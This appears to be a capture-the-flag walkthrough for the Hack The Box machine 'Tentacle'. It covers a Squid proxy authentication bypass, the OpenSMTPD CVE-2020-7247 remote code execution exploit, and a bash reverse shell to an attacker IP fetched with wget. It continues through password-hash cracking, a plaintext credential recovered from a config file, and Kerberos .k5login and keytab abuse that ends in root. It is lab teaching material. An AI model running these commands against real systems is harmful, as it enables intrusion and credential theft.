@@ -1,0 +1,204 @@
+Tentacle
+14th June 2021 / Document No D20.100.123
+Prepared By: MrR3boot
+Machine Author(s): polarbearer
+Difficulty: Hard
+Classification: Official
+Synopsis
+
+Tentacle is a Hard linux machine featuring a Squid proxy server. Bypassing Squid proxy authentication
+reveals a host which is making use of a vulnerable OpenSMTPD service. Initial foothold can be achieved by
+the exploitation of it. A SMTP client configuration file discloses a password which assists in generating a
+valid Kerberos ticket. This ticket then can be used to move laterally. Finally a cronjob can be exploited to
+escalate to another user who has privileges to add root user to Kerberos principals. This gives us a root
+shell.
+
+Skills Required
+
+      Enumeration
+      Basic Linux Knowledge
+
+Skills Learned
+
+      DNS Enumeration
+      Squid Proxy Enumeration
+      OpenSMTPD Exploitation
+      Kerberos
+Enumeration
+
+Nmap
+
+Let's start by performing a port scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.224 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -sC -sV -p$ports 10.10.10.224
+
+Nmap TCP scan reveals few ports including Kerberos and Squid Proxy which are listening on their default
+ports. Let's perform also an UDP port scan.
+
+UDP scan reveals that DNS ISC BIND, Kerberos and NTP are also listening on their default ports.
+
+Squid Proxy
+
+Browsing to port 3128 reveals a domain name and an email address.
+DNS
+
+Knowing the domain name realcorp.htb , we can start enumerating the DNS server using the dnsenum
+tool.
+
+   dnsenum --dnsserver 10.10.10.224 -f
+   /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt realcorp.htb
+
+This found few new subdomains. wpad.realcorp.htb subomain looks interesting.
+
+WPAD
+The Web Proxy Auto-Discovery (WPAD) Protocol can be used to allow web browsers to automatically
+discover the location of Proxy Auto-Configuration (PAC) files on the network, either via DHCP or via DNS. A
+PAC file is a text file that instructs a browser to forward traffic to a proxy server, instead of directly to the
+destination server.
+The DNS-based method requires a host called wpad.<domain> serving a PAC file called wpad.dat via HTTP
+( http://wpad.<domain>/wpad.dat ). Browsers running on computers in the domain will automatically get
+this file and use it for auto-configuration.
+In our case it should be located at http://wpad.realcorp.htb/wpad.dat . Since we can't access the
+internal network directly, we can try making a request using Squid as the proxy.
+
+   curl --proxy http://10.10.10.224:3128 http://wpad.realcorp.htb/wpad.dat
+
+This action is failing as the proxy server requires authentication. We can try to send a request to localhost
+through squid proxy.
+
+It returns an Invalid URL message, meaning that accessing localhost indeed doesn't require any
+authentication. Depending on the Squid configuration, requests with source address of 127.0.0.1 might
+be allowed to bypass authentication for specific destinations, or even for all destinations in some cases (the
+configuration directive http_access allow localhost is often found in squid.conf by default).
+We update proxychains configuration /etc/proxychains.conf in our machine to use dynamic
+chaining.Dynamic chaining will help us to run our traffic through every proxy on the list.
+
+   http 10.10.10.224 3128
+   http 127.0.0.1 3128
+We also add wpad.realcorp.htb entry to our hosts file.
+   echo '10.197.243.31 wpad.realcorp.htb' >> /etc/hosts
+Now we try again to access wpad.realcorp.htb host through the use of proxychains.
+
+This action is also failing. Less restrictive ACLs might be in place for requests with source address of
+10.197.243.77 , which is the proxy address. We update proxychains configuration to add the new proxy
+address 10.197.243.77 .
+
+   http 10.10.10.224 3128
+   http 127.0.0.1 3128
+   http 10.197.243.77 3128
+Sending request to wpad.realcorp.htb host once again with the above configuration succeeds.
+
+It is now possible to download the PAC file from this host.
+From the PAC file, we observe that the domain realcorp.htb , along with the subnet ranges
+10.197.243.0/24 and 10.241.251.0/24 , are configured for direct access, while every other destination is
+set to pass through the proxy server.
+Foothold
+
+We enumerate the new subnet 10.241.251.0/24 . The following bash one-liner can be used to query the
+DNS server for PTR records on the 10.241.251.0/24 subnet:
+
+   for i in {1..254}; do dig -x 10.241.251.$i +noall +answer @10.10.10.224; done
+
+A new host srvpod01 was found. We continue our enumeration by performing a portscan on this host.
+
+Nmap reveals that port 25 (smtp) is open and OpenSMTPD service is running on this port. A vulnerability
+(CVE-2020-7247) was discovered in OpenSMTPD 6.6 that allows remote command execution (RCE). Public
+exploit is available for this vulnerability. We download and modify the exploit to include
+j.nakazawa@realcorp.htb as a valid email in the recipient address.
+
+   ...
+   print('[*] Payload sent')
+   s.send(b'RCPT TO:<j.nakazawa@realcorp.htb>\r\n')
+   ...
+We also start a tcpdump listener to capture any icmp packets from the provided command of the following
+exploit.
+   tcpdump -i tun0 icmp
+Finally we run the exploit to validate the presence of the vulnerability.
+   proxychains python3 47984.py 10.241.251.113 25 'ping -c 3 10.10.14.5'
+After confirming we setup a listener on port 1234 and issue the below commands to get the reverse shell.
+
+   echo 'bash -c "bash -i >& /dev/tcp/10.10.14.5/1234 0>&1"' > /var/www/html/index.html
+   sudo service apache2 start
+   proxychains python3 47984.py 10.241.251.113 25 'wget 10.10.14.5;bash index.html'
+Lateral Movement #1
+
+Having foothold in the system, we can start further enumerating the server. The OpenSMTPD configuration
+file ( /etc/smtpd/smtpd.conf ) reveals that authentication is enabled for local TLS connections.
+
+The /etc/smtpd/creds file contains the password hash for j.nakazawa user. We can try to crack this
+hash using John The Ripper tool.
+
+   echo -n
+   '$6$EbpPCRMuO/Xwwv51$OVFV3eryJuJnk1vev7WX4JKgU6v8ND0zjXiI0CDMB0E4N6.bsp.2bpmNVUbYPRSIE9
+   5ex6dS92UbUAvcVdL.M/' > hash
+   john --wordlist=/usr/share/wordlists/rockyou.txt hash
+Unfortunately is not possible to crack this hash. By enumerating home folders we spot a .msmtprc file.
+msmtp is an SMTP client which can be used to send emails from mail user agents. It requires a configuration
+file ~/.msmtprc with all required information in order to function. By checking the contents of this file
+reveals a plaintext password.
+
+We try to connect to SSH service using the credentials: j.nakazawa / sJB}RM>6Z~64_ with no success. As
+there's Kerberos service running on the server, these credentials can be used to generate a Kerberos ticket
+which can then be used to authenticate to the SSH service. We configure the file /etc/krb5.conf as below
+in our machine.
+
+[libdefaults]
+       default_realm = REALCORP.HTB
+
+[realms]
+       REALCORP.HTB = {
+                     kdc = srv01.realcorp.htb:88
+       }
+
+[domain_realm]
+       .realcorp.htb = REALCORP.HTB
+       realcorp.htb = REALCORP.HTB
+
+We add an additional entry to our hosts file.
+
+echo '10.10.10.224  srv01.realcorp.htb' >> /etc/hosts
+To make sure our local time is synchronized with the time of the KDC, we run ntpdate .
+   ntpdate 10.10.10.224
+
+We issue the below command to get a global ticket for j.nakazawa user.
+Running klist command shows that the ticket is successfully created.
+
+It is now possible to SSH as user j.nakazawa using the Kerberos ticket.
+
+User flag can be found in /home/j.nakazawa/user.txt .
+Lateral Movement #2
+
+Enumerating the host we observe an entry in crontab.
+
+We review the contents of the log_backup.sh script.
+   #!/bin/bash
+   /usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/
+   cd /home/admin
+   /usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log
+   /usr/bin/rm -f access.log cache.log
+
+This script copies all files from /var/log/squid to /home/admin folder and creates an archive from log
+files. It then removes log files from the /home/admin folder. User j.nakazawa is part of squid group and
+can write to this folder. This gives us the ability to write arbitrary files to /home/admin folder.
+According to the MIT Kerberos documentation, .k5login files can be used to grant other users (identified
+by Kerberos principals) access to an account without the need of a password. Having already obtained a
+Kerberos ticket for the j.nakazawa@REALCORP.HTB principal, we can exploit the arbitrary file write
+vulnerability to write a .k5login file to /home/admin and obtain access as the admin user.
+We issue the below command to write .k5login file to /var/log/squid folder
+
+   echo "j.nakazawa@REALCORP.HTB" > /var/log/squid/.k5login
+After a minute we can login to SSH as admin user.
+Privilege Escalation
+
+By further enumerating the system, we find that the /etc/krb5.keytab file is owned (and readable) by the
+admin group.
+
+We list the principals in the keytab file issuing the below command.
+   klist -kt /etc/krb5.keytab
+
+The kadmin/admin@REALCORP.HTB principal is included in the keytab. This allows us to run kadmin with
+admin privileges and create the root@REALCORP.HTB principal.
+We switch to root user using ksu utility. We provide test when prompted for the password.
+This gives us root shell. Root flag can be found in /root/root.txt .
+
